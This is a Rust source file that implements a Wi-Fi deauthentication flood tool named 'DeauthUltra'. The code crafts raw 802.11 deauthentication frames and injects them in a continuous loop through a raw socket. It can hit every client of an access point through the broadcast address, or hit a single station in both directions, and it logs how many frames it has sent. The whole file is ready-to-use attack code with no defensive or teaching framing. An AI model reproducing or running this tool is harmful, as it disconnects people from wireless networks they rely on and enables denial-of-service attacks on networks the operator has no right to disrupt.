use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

const RADIOTAP: [u8; 12] = [0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
const FRAME_LEN: usize = 38;

fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac.split(':').collect();
    if parts.len() != 6 { return None; }
    let mut bytes = [0u8; 6];
    for (i, p) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(p, 16).ok()?;
    }
    Some(bytes)
}

fn build_frame(bssid: &[u8; 6], station: &[u8; 6], reason: u16, seq: u16, ts: u64) -> [u8; FRAME_LEN] {
    let mut frame = [0u8; FRAME_LEN];
    frame[0..12].copy_from_slice(&RADIOTAP);
    frame[8..12].copy_from_slice(&(ts as u32).to_le_bytes());
    frame[12] = 0xC0; frame[13] = 0x00;
    frame[14] = 0x3A; frame[15] = 0x01;
    frame[16..22].copy_from_slice(station);
    frame[22..28].copy_from_slice(bssid);
    frame[28..34].copy_from_slice(bssid);
    let sc = (seq & 0xFFF) << 4;
    frame[34] = (sc & 0xFF) as u8;
    frame[35] = ((sc >> 8) & 0xFF) as u8;
    frame[36] = (reason & 0xFF) as u8;
    frame[37] = ((reason >> 8) & 0xFF) as u8;
    frame
}

pub struct DeauthUltra {
    running: Arc<AtomicBool>,
    sent: Arc<AtomicU64>,
}

impl DeauthUltra {
    pub fn new(iface: &str, bssid: &str, station: &str, reason: u16) -> Option<Self> {
        let bssid_bytes = parse_mac(bssid)?;
        let station_bytes = if station == "FF:FF:FF:FF:FF:FF" {
            [0xFF; 6]
        } else {
            parse_mac(station)?
        };
        let targeted = station != "FF:FF:FF:FF:FF:FF";
        let running = Arc::new(AtomicBool::new(true));
        let sent = Arc::new(AtomicU64::new(0));

        let r = running.clone();
        let s = sent.clone();
        let iface_own = iface.to_string();

        thread::spawn(move || {
            let sock = match crate::raw_injector::RawSocket::open(&iface_own) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("[Rust-v1] Socket error: {}", e);
                    return;
                }
            };

            let channels_24: [i32; 13] = [1,2,3,4,5,6,7,8,9,10,11,12,13];
            let channels_5: [i32; 25] = [36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165,169];
            let all_ch: Vec<i32> = channels_24.iter().chain(channels_5.iter()).copied().collect();
            let mut ch_idx = 0usize;
            let mut seq = 0u16;

            while r.load(Ordering::Relaxed) {
                let ch = all_ch[ch_idx % all_ch.len()];
                ch_idx += 1;

                let mut frames: Vec<[u8; FRAME_LEN]> = Vec::with_capacity(128);

                for _ in 0..64 {
                    if !r.load(Ordering::Relaxed) { break; }
                    let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_micros() as u64;
                    frames.push(build_frame(&bssid_bytes, &station_bytes, reason, seq, ts));
                    seq = (seq + 1) & 0xFFF;

                    if targeted {
                        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_micros() as u64;
                        frames.push(build_frame(&station_bytes, &bssid_bytes, reason, seq, ts));
                        seq = (seq + 1) & 0xFFF;
                    }
                }

                for frame in &frames {
                    if sock.send(frame).is_ok() {
                        s.fetch_add(1, Ordering::Relaxed);
                    }
                }

                let total = s.load(Ordering::Relaxed);
                eprintln!("\r[Rust-v1] ULTRA: {} frames (ch {})", total, ch);
            }
        });

        Some(DeauthUltra { running, sent })
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    pub fn sent(&self) -> u64 {
        self.sent.load(Ordering::Relaxed)
    }
}
